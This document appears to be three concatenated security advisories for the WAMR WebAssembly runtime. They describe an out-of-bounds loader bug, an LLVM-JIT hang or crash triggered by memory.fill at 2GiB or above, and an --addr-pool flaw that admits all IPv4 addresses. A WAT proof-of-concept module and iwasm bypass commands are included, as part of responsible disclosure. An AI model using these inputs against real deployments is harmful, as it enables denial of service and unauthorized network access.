An out-of-bounds array access issue exists in WAMR's fast interpreter mode during WASM bytecode loading. When `frame_ref_bottom` and `frame_offset_bottom` arrays are at capacity and a `GET_GLOBAL(I32)` opcode is encountered, `frame_ref_bottom` is expanded but `frame_offset_bottom` may not be. If this is immediately followed by an `if` opcode that triggers `preserve_local_for_block`, the function traverses arrays using `stack_cell_num` as the upper bound, causing out-of-bounds access to `frame_offset_bottom` since it wasn't expanded to match the increased `stack_cell_num`.

### Details
1. Problematic Sequence
When GET_GLOBAL(I32) is processed,  increases `stack_cell_num` by 1 and may expand frame_ref_bottom array, For I32 (32-bit type), it may early return without additional expansion checks. If frame_offset_bottom is not at boundary yet, no expansion occurs despite stack_cell_num being increased

2. Out-of-Bounds Access 
When `if` opcode is encountered next,  it calls PRESERVE_LOCAL_FOR_BLOCK, which  iterates through `stack_cell_num` for `frame_offset_bottom` which may be out of bounds.
### PoC
To reproduce the vulnerability:
1. Enable fast interpreter mode 
2. Load a WASM module with a function containing:
    - Multiple operations that fill frame_ref and frame_offset arrays close to capacity
    - A GET_GLOBAL opcode accessing an I32 global variable (when arrays are at/near capacity)
    - Immediately followed by an IF opcode

### Impact

summary: When `address >= 2GiB` in `memory.fill` , `iwasm` cannot exit normally in `LLVM-JIT` mode.
description:
### Summary


### Details
Found that `LLVM_JIT` mode does not terminate properly when executing a `wasm` program that contains a specific case. However `FAST_JIT` mode and other runtime tools can be executed and exited normally.

In this case, the program contains the `memory.fill` directive. And the first operand of the instruction, that is, the pointer to the region to update, when the range is greater than or equal to 2 GiB (2147483648 Bytes). When the range is less than 2GiB, it exits normally.

Note: The operation scope of `memory.fill` here does not exceed the memory range of the `wasm` module, otherwise out of bounds memory access will appear.

### PoC
```
(module
  (type (;0;) (func (param i32)))
  (type (;1;) (func))
  (type (;2;) (func (result i32)))
  (import "wasi_snapshot_preview1" "proc_exit" (func (;0;) (type 0)))
  (func (;1;) (type 1))
  (func (;2;) (type 1)
    (local i32)
    (memory.fill
      (i32.const 2147483648)
      (i32.const 217)
      (i32.const 1))
    (call 0
      (i32.const 0))
    (unreachable))
  (table (;0;) 2 2 funcref)
  (memory (;0;) 57491 57491)
  (global (;0;) (mut i32) (i32.const 66576))
  (export "memory" (memory 0))
  (export "__indirect_function_table" (table 0))
  (export "_start" (func 2))
  (elem (;0;) (i32.const 1) func 1))
```
When `first parameter >= 2GiB` in `memory.fill`, it will be reproduced.

### Impact
This is caused by a bug in the program, which leads to accessing an invalid pointer. The release version will hang and the debug version will crash.

summary: `--addr-pool` option allows all IPv4 addresses when subnet mask is not specified
description:
### Summary
Using `--addr-pool` with an IPv4 address that lacks a subnet mask causes the system to allow all IP addresses. This can unintentionally expose the service to all incoming connections and bypass intended access restrictions.

### Details
The issue was observed on Ubuntu 22.04 LTS.

```c
address = strtok(cp, "/");
mask = strtok(NULL, "/");

ret = addr_pool_insert(apool, address, (uint8)(mask ? atoi(mask) : 0));
```
[source code](https://github.com/bytecodealliance/wasm-micro-runtime/blob/main/core/iwasm/common/wasm_runtime_common.c#L3810-L3813)

When subnet mask is not specified, the `addr-pool` entry is added with a mask value of 0.

This behavior has only been confirmed on Linux, but similar behavior may be present on other platforms.

### PoC
Build [wasm-micro-runtime/samples/socket-api](https://github.com/bytecodealliance/wasm-micro-runtime/tree/main/samples/socket-api) to use `tcp_server.wasm`, `tcp_client.wasm`.

Use [iwasm-2.4.0-x86_64-ubuntu-22.04.tar.gz](https://github.com/bytecodealliance/wasm-micro-runtime/releases/download/WAMR-2.4.0/iwasm-2.4.0-x86_64-ubuntu-22.04.tar.gz) to run wasm files.

Start tcp server.

```bash
./iwasm --addr-pool=0.0.0.0/15 tcp_server.wasm
```

Start tcp client and set any IPv4 address without subnet mask.

```bash
./iwasm --addr-pool=1.2.3.4 tcp_client.wasm
[Client] Create socket
[Client] Connect socket
[Client] Local address is: 127.0.0.1:34536
[Client] Client receive
[Client] 115 bytes received:
Buffer received:
Say Hi from the Server
Say Hi from the Server
Say Hi from the Server
Say Hi from the Server
Say Hi from the Server

[Client] BYE 
```

Despite an incorrect IP address, the program operates properly.

### Impact
Services relying on `--addr-pool` for restricting access by IP may unintentionally become open to all external connections. This may lead to unauthorized access in production deployments, especially when users assume that specifying an IP without a subnet mask implies a default secure configuration.
